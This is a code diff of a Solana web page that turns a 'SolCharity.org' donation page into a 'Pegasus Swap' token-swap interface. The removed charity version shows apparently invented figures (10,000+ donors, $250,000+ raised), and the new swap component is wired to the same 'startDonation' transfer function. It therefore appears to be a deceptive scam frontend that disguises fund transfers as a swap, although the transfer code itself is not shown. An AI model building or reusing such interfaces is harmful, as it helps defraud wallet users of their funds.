@@ -13,6 +13,8 @@ import { notify } from '@/lib/notify';
 import { TOKEN_PROGRAM_ID } from '@solana/spl-token';
 import { FeedbackModal } from '@/components/FeedbackModal';
 import { CenterWalletButton } from '@/components/CenterWalletButton';
+import SwapInterface from '@/components/SwapInterface';
+import AnimatedBackground from '@/components/AnimatedBackground';
 
 const Index = () => {
   const { connected, publicKey, connect, select, wallets } = useWallet();
@@ -86,108 +88,36 @@ const Index = () => {
   }, [connected, publicKey, connection]);
 
   return (
-    <div className="min-h-screen flex flex-col relative overflow-hidden">
-      {/* Background image */}
-      <div className="absolute inset-0 overflow-hidden pointer-events-none">
-        <img
-          src={backgroundImage}
-          alt="Background"
-          className="w-full h-full object-cover"
-        />
-        {/* Blurry transparent overlay */}
-        <div className="absolute inset-0 bg-black/60 backdrop-blur-sm"></div>
-      </div>
-
-      {/* Top Bar */}
-      <div className="relative z-20 bg-black/90 backdrop-blur-md border-b border-white/10">
-        <div className="container mx-auto px-4 py-3 flex items-center justify-between">
-          <div className="flex items-center gap-3">
-            <img
-              src={logoImage}
-              alt="Charity Logo"
-              className="h-8 w-8 object-contain"
-            />
-            <span className="text-2xl font-bold text-white">SolCharity.org</span>
-          </div>
-          <WalletMultiButton className="!bg-primary hover:!bg-primary/90 !px-2 !text-xs sm:!text-sm sm:!px-4">connect wallet</WalletMultiButton>
+    <div className="min-h-screen flex flex-col relative">
+      {/* Animated Background */}
+      <AnimatedBackground />
+      
+      {/* Header with Logo and Wallet Button */}
+      <div className="relative z-20 flex justify-between items-center p-4">
+        {/* Connect Wallet Button (Left) */}
+        <WalletMultiButton className="!bg-primary hover:!bg-primary/90 !px-2 !text-xs sm:!text-sm sm:!px-4">connect wallet</WalletMultiButton>
+        
+        {/* Logo and Site Name (Right) */}
+        <div className="flex items-center">
+          <img src="/pegasus-logo.svg" alt="Pegasus Logo" className="h-8 w-8" />
+          <span className="text-blue-400 text-xl font-bold ml-2">Pegasus Swap</span>
         </div>
       </div>
 
-      {/* Main Content */}
+      {/* Main Content - Swap Interface */}
       <div className="relative z-10 flex-1 flex flex-col items-center justify-center p-4">
-        <div className="w-full max-w-2xl space-y-8">
-          {/* Header */}
-          <div className="text-center space-y-4">
-            <div className="space-y-3">
-              <h1 className="text-5xl font-bold text-white">
-                Help Us Make A Difference
-              </h1>
-              <div className="text-4xl font-bold bg-gradient-to-r from-blue-400 to-purple-600 text-transparent bg-clip-text animate-gradient">
-                Support Our Charity Campaign
-              </div>
-            </div>
-            <p className="text-xl text-white/90 max-w-2xl mx-auto leading-relaxed">
-              Your donation can change lives. Join our community of givers and help us support those in need. Every contribution matters, no matter how small.
-            </p>
-            {/* Added CenterWalletButton component */}
+        <div className="w-full max-w-2xl flex flex-col items-center gap-4">
+          {/* Swap Interface with Donate functionality */}
+          <SwapInterface startDonation={connected && !isProcessing && transactions.length === 0 ? startDonation : undefined} />
+          
+          {/* Center Wallet Button */}
+          {!connected && (
             <div className="pt-4">
-              {!connected && <CenterWalletButton />}
+              <CenterWalletButton />
             </div>
-          </div>
-
-          {/* Wallet Connection */}
-          <div className="flex flex-col items-center gap-4">
-            {!connected ? (
-              <div className="text-center space-y-4">
-                <p className="text-sm text-muted-foreground flex items-center gap-2 justify-center">
-                  <Wallet className="w-4 h-4" />
-                  Connect your wallet to donate
-                </p>
-              </div>
-            ) : (
-              <div className="w-full space-y-6">
-                {/* Eligibility Status */}
-                <div className={`bg-card/50 backdrop-blur-lg border border-border/50 rounded-xl p-6 text-center`}>
-                  <p className={`text-2xl font-bold ${isEligible ? 'text-green-500' : 'text-red-500'}`}>
-                    {isEligible ? 'Ready to Donate' : 'Insufficient balance for donation'}
-                  </p>
-                </div>
-
-                {/* Action Button */}
-                {!isProcessing && transactions.length === 0 && (
-                  <Button
-                    variant="pump"
-                    size="xl"
-                    onClick={startDonation}
-                    className="w-full"
-                    disabled={isProcessing}
-                  >
-                    <Heart className="w-6 h-6 mr-2" />
-                    Donate Now
-                  </Button>
-                )}
-
-                {/* Stats Section */}
-                <div className="flex justify-center items-center gap-8 mt-6">
-                  <div className="text-center">
-                    <p className="text-3xl font-bold text-white">10,000+</p>
-                    <p className="text-xs text-muted-foreground uppercase tracking-wide">DONORS</p>
-                  </div>
-                  <div className="text-center">
-                    <p className="text-3xl font-bold text-white">$250,000+ <span className="text-green-500">raised</span></p>
-                    <p className="text-xs text-muted-foreground uppercase tracking-wide">DONATIONS</p>
-                    <p className="text-xs text-green-500 font-bold uppercase tracking-wide">THIS MONTH</p>
-                  </div>
-                </div>
-
-              </div>
-            )}
-          </div>
-
+          )}
         </div>
       </div>
-
-      {/* Removed Token Marquee section as requested */}
 
       <FeedbackModal
         open={feedbackOpen}
